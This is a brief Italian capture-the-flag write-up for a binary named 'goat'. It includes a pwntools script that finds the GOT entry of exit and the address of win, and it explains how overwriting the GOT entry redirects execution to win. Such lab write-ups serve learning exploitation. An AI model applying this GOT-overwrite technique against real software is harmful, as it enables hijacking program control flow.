potevi anche non darmi il codice c ma ok:
- ottengo l'indirizzo di exit
- ottengo l'indirizzo di win

script python per ottenerli:
```
from pwn import *

elf = ELF('./goat')

target_addressExit = elf.got['exit']
target_addressWin = elf.symbols['win']
print ('target address:\t', hex(target_addressExit))
print ('target address:\t', hex(target_addressWin))
```

output:
```
target address:  0x804c018
target address:  0x80491c6
```
nel primo input metto 804c018, nel secondo 80491c6
il primo indirizzo indica l'indirizzo della cella della funzione da sostituire, il secondo indica il valore della cella della funzione che voglio. Una volta che il progeamma arriva alla funzione exit() in realtà esegue win() perché il valore della sua cella è stato modificato con quello che ho scritto nel secondo input.